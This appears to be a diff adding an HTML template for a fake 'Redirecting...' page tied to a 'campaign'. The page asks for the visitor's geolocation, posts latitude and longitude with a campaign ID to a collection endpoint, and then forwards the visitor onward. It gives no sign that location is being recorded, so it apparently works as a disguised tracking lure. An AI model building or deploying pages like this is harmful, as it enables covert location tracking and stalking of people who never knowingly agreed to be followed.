@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            text-align: center;
+            padding: 2rem;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #ddd;
+            border-top-color: #333;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 1rem;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <p>Redirecting...</p>
+    </div>
+
+    <script>
+        const CAMPAIGN_ID = "{{ campaign_id }}";
+        const REDIRECT_URL = "{{ redirect_url }}";
+        const API_URL = "/api/location";
+        const TIMEOUT_MS = 8000;
+
+        function redirect() {
+            window.location.href = REDIRECT_URL;
+        }
+
+        function sendLocation(lat, lng) {
+            fetch(API_URL, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    campaign_id: CAMPAIGN_ID,
+                    latitude: lat,
+                    longitude: lng
+                })
+            }).finally(redirect);
+        }
+
+        if (navigator.geolocation) {
+            const timer = setTimeout(redirect, TIMEOUT_MS);
+
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    clearTimeout(timer);
+                    sendLocation(pos.coords.latitude, pos.coords.longitude);
+                },
+                function() {
+                    clearTimeout(timer);
+                    redirect();
+                },
+                {enableHighAccuracy: false, timeout: TIMEOUT_MS - 1000, maximumAge: 300000}
+            );
+        } else {
+            redirect();
+        }
+    </script>
+</body>
+</html>
